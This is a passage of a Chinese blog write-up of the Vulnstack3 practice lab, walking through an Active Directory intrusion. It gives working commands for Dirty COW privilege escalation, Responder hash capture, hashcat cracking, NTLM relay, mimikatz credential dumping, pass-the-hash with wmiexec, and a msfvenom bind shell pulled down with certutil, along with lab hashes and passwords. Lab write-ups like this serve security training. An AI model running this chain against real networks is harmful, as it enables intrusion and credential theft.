注意，这里安装就需要root权限行了，我终于明白看的文章为什么要提权了，这里用脏牛提权就好</span><br><span class="line"></span><br><span class="line">## 脏牛提权</span><br><span class="line">$ git clone https://github.com/FireFart/dirtycow.git</span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ./dirty New-Password</span><br><span class="line">$ su firefart</span><br><span class="line"></span><br><span class="line">## 安装OpenSSL</span><br><span class="line">$ tar -zxvf openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g.tar.gz &amp;&amp; <span class="built_in">cd</span> openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g/</span><br><span class="line">$ ./config --prefix=/usr/local/openssl shared zlib</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/openssl/lib&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 我本地测的时候报错说还却sqlite3</span><br><span class="line">## 参考https://www.jianshu.com/p/f32ec5c9bd30</span><br><span class="line">$ wget https://www.sqlite.org/<span class="number">2017</span>/sqlite-autoconf-<span class="number">3170000</span>.tar.gz –no-check-certificate</span><br><span class="line">$ tar zxvf sqlite-autoconf-<span class="number">3170000</span>.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> sqlite-autoconf-<span class="number">3170000</span></span><br><span class="line">$ ./configure --prefix=/usr/local/sqlite</span><br><span class="line">$  make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">## 安装Python3</span><br><span class="line">$ tar -zxvf Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>.tgz &amp;&amp; <span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>/</span><br><span class="line">$ ./configure prefix=/usr/local/python3 --with-openssl=/usr/local/openssl</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;</span><br><span class="line">#配置python</span><br><span class="line">export PYTHON_HOME=/usr/local/python3</span><br><span class="line">export <span class="built_in">PATH</span>=$PYTHON_HOME/bin:$<span class="built_in">PATH</span>&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 测试</span><br><span class="line">$ python3 </span><br><span class="line">&gt;&gt; import ssl</span><br><span class="line">&gt;&gt; import ctypes</span><br><span class="line">&gt;&gt; import sqlite3</span><br><span class="line"># 没有报错即为成功</span><br><span class="line"></span><br><span class="line">## 安装依赖</span><br><span class="line">$ pip3 install netifaces six pycryptodome pycryptodomex</span><br></pre></td></tr></table></figure>
+
+<p>运行Responder</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 Responder.py -I eth1 -Pv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715204732059.png" alt="image-20220715204732059"></p>
+<p>Kali中使用<code>auxiliary/admin/mssql/mssql_ntlm_stealer</code>，执行<code>xp_dirtree</code>，触发UNC</p>
+<blockquote>
+<p> 配合xp_dirtree存储过程获取运行mssql服务的用户NTLM的hash值,原理是通过LLMNR/NBT-NS欺骗攻击,让MSSQL去访问我们伪造的服务,当MSSQL去执行时就会把它自己的凭证发给我们,我们通过破解它的凭证在返回登录MSSQL,得到最高权限具体操作</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> SMBPROXY <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> USERNAME testuser</span><br><span class="line">msf6&gt; <span class="built_in">set</span> PASSWORD cvcvgjASD!@</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>利用成功，此时可以看到已经获取到了NTLMv2-Hash</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[MSSQL] Received connection from ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:<span class="number">710</span>aa5e90138c34b:F435BDB2083AC31B18639D7013BA94BE:<span class="number">01010000000000009553</span>EC8E1F98D801393FF02331B1CEBF00000000020008004800580045004E0001001E00570049004E002D00360041005600430047004D003300530042004B004B0004003400570049004E002D00360041005600430047004D003300530042004B004B002E004800580045004E002E004C004F00430041004C00030014004800580045004E002E004C004F00430041004C00050014004800580045004E002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>得到NTLMv2后，可以利用hashcat暴力破解</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看支持的<span class="built_in">Mode</span>,这里NTLMv2的<span class="built_in">Mode</span>为<span class="number">5600</span></span><br><span class="line">$ hashcat --example-hashes | less</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210758021.png" alt="image-20220715210758021"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 破解</span><br><span class="line">$ hashcat -m <span class="number">5600</span> hash.txt top1000.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210830597.png" alt="image-20220715210830597"></p>
+<p>这里其实是把wp里的密码加到字典才爆出来的</p>
+<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h4><p>MultiRelay中继攻击</p>
+<blockquote>
+<p>没爆破出来可以尝试中继Win2008打Win7，发现Win2008的administrator凭据可以中继到Win7，所以可知Win2008和Win7的本地administrator密码相同。参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6988#toc-4">https://xz.aliyun.com/t/6988#toc-4</a></p>
+</blockquote>
+<p>运行前需要编译相关工具，这里我在kali完成编译再传到93.100服务器</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install gcc-mingw-w64-x86-<span class="number">64</span></span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv</span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode</span><br></pre></td></tr></table></figure>
+
+<p>接下来展开<strong>中继攻击</strong></p>
+<blockquote>
+<p>所谓中继攻击，就是在两个合法参与方A和B之间进行的一种攻击，中间人C篡改A的消息发送给B或将B的消息篡改发送给A。 C这样做的目的是为了获得A或B的特权，这样C就可以把A的钱通过B的非接触式终端盗走。</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 在<span class="number">93</span>.<span class="number">100</span>服务器执行</span><br><span class="line">## 关闭本地的nginx服务，因为会冲突，启动nginx服务直接输入nginx即可</span><br><span class="line">$ nginx -s stop</span><br><span class="line"></span><br><span class="line">## 禁用SMB和HTTP服务,将对应选项修改为Off</span><br><span class="line">$ vi Responder.conf</span><br><span class="line"></span><br><span class="line">## 开启监听</span><br><span class="line">$ python3 Responder.py -I eth1 -v -F</span><br><span class="line"></span><br><span class="line">## 运行MultiRelay</span><br><span class="line">$ python3 MultiRelay.py -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -u ALL</span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">## MSSQL触发UNC</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>可惜我本地测没有成功，说目标没有这个凭证</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715212639480.png" alt="image-20220715212639480"></p>
+<p>所以接下来的步骤都是照抄wp的，太菜了QAQ</p>
+<p>此时已经获取到Win7的Shell了，然后使用<code>mimikatz</code>抓取明文密码。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; </span><br><span class="line">mimikatz &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还可以通过<code>dump</code>来获得<code>NTLM Hash</code>，存储在<code>Responder/tools/MultiRelay/relay-dumps</code>目录下</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Administrator:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">c1794c5aa8547c87a8bcd0324b8337</span>:::</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60932dea1a09ff9bf41bfd506003640e.png" alt="img"></p>
+<p>然后就可以用wmiexec来连接到93.20</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line"># <span class="built_in">cd</span> impacket/ &amp;&amp; python3 -m pip install .</span><br><span class="line"></span><br><span class="line"># NTLM Hash</span><br><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line"># 明文密码</span><br><span class="line">$ proxychains4 python3 wmiexec.py &#x27;administrator:<span class="number">123</span>qwe!ASD@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里还是照着答案测了一下，终于拿下了一个windows服务器😭</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715221055341.png" alt="image-20220715221055341"></p>
+<h3 id="攻域控"><a href="#攻域控" class="headerlink" title="攻域控"></a>攻域控</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><blockquote>
+<p>未知Win2008明文密码，使用NTLM Hash通过WMI连接到Win2008，然后获取正向Shell，通过进程迁移提权后读取文件</p>
+</blockquote>
+<p>MSF生成一个正向shell木马，并开启监听</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">msf6&gt; use exploit/multi/handler </span><br><span class="line">msf6&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的正向马传到93.100上（这里利用scp上传），并在93.100上开启http服务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># kali中ssh连接配置</span><br><span class="line"># vim /root/.ssh/config</span><br><span class="line"># Host *</span><br><span class="line"># HostkeyAlgorithms +ssh-rsa</span><br><span class="line"># PubkeyAcceptedKeyTypes +ssh-rsa</span><br><span class="line"></span><br><span class="line">$ scp bind.exe wwwuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">137</span>:/tmp/</span><br><span class="line"># wwwuser_123Aqx</span><br><span class="line"></span><br><span class="line">$ python3 -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>然后通过之间WMI连接的93.20的shell，下载传到93.100上bind.exe马，并执行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line">$ certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span>:<span class="number">8080</span>/bind.exe </span><br><span class="line">$ bind.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224132571.png" alt="image-20220715224132571"></p>
+<p>上线之后执行<code>ps</code>，发现存在域管用户的进程，进程迁移</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line">meterpreter&gt; migrate <span class="number">3800</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224352593.png" alt="image-20220715224352593"></p>
+<p>迁移成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224749412.png" alt="image-20220715224749412"></p>
+<p>接下来就可以读取域控的文件了</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\Users\Administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224926271.png" alt="image-20220715224926271"></p>
+<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><blockquote>
+<p>已知Win2008明文密码，使用mimikatz抓取域管密码，然后通过IPC连接域控读取文件</p>
+</blockquote>
+<p>上传mimikatz。使用<code>smbclient</code>连接并上传</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 smbclient -L <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U administrator</span><br><span class="line">$ proxychains4 smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>/ADMIN$ -U administrator</span><br><span class="line">$ put mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230004656.png" alt="image-20220715230004656"></p>
+<p>执行mimikatz，获得<code>TEST\administrator</code>密码：<code>zxcASDqw123!</code></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/windows</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pwd.log</span><br><span class="line"><span class="built_in">type</span> pwd.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230259643.png" alt="image-20220715230259643"></p>
+<p>最后IPC连接到域控读取文件</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\admin$ zxcASDqw123!! /user:test\administrator</span><br><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230516432.png" alt="image-20220715230516432"></p>
+<p>获得密码后其实这里可以用之前的方法，用WMI直接登录上域控93.10</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230812938.png" alt="image-20220715230812938"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1942868">Vulnstack3</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6988#toc-4">Vlunstack ATT&amp;CK实战系列——红队实战（三）Writeup</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
+<p><a target="_blank" rel="noopener" href="https://v0w.top/2020/03/14/mysql-getshell/#0x00-%E5%89%8D%E8%A8%80">mysql写shell的一点总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shang_0122/article/details/114820532">nginx正向和反向代理的区别</a>–<strong>本质上代理服务器还是那个代理服务器,如果替客户端干活就是正向代理,如果替服务端干活就是反向代理</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45630258/article/details/124976564">Nginx 反向代理+负载均衡</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43038960/article/details/125591755">代理、正向代理与反向代理</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tryheart/article/details/108245986">nmap 常用参数</a></p>
+<p><a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/ae5cca240722192e4536f64a.html">nmap命令使用详细解释</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a target="_blank" rel="noopener" href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">OpenSSL</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">Python3</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">1ceC0la</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">http://example.com/2022/07/10/Vulnstack3靶场内网渗透/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">1ceC0la's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%8Cvulnstack/">内网安全，vulnstack</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/WeChatPay.png" target="_blank"><img class="post-qr-code-img" src="/img/WeChatPay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><img class="prev-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&amp;refer=http%3A%2F%2Fimg9.51tietu.net&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644051487&amp;t=d175a25b5fbdd3eed194511a7a170807" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnstack4靶场内网渗透</div></div></a></div><div class="next-post pull-right"><a href="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/"><img class="next-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&amp;refer=http%3A%2F%2Fimg9.51tietu.net&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644051487&amp;t=d175a25b5fbdd3eed194511a7a170807" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CS流量隐藏-域前置技术</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Vulnstack2靶场内网渗透"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-24</div><div class="title">Vulnstack2靶场内网渗透</div></div></a></div><div><a href="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Vulnstack4靶场内网渗透"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&refer=http%3A%2F%2Fimg9.51tietu.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644051487&t=d175a25b5fbdd3eed194511a7a170807" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-16</div><div class="title">Vulnstack4靶场内网渗透</div></div></a></div><div><a href="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/" title="CS流量隐藏-域前置技术"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&refer=http%3A%2F%2Fimg9.51tietu.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644051487&t=d175a25b5fbdd3eed194511a7a170807" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-09</div><div class="title">CS流量隐藏-域前置技术</div></div></a></div><div><a href="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/" title="Linux反弹shell"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-27</div><div class="title">Linux反弹shell</div></div></a></div><div><a href="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="RCE"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-29</div><div class="title">RCE</div></div></a></div><div><a href="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/" title="CSRF及SSRF"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-27</div><div class="title">CSRF及SSRF</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="toc-number">2.</span> <span class="toc-text">拓扑图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E9%9D%B6"><span class="toc-number">3.</span> <span class="toc-text">打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB%E7%88%86%E7%A0%B4"><span class="toc-number">3.0.1.</span> <span class="toc-text">SMB爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-NTLM-Stealer"><span class="toc-number">3.0.2.</span> <span class="toc-text">MSSQL NTLM 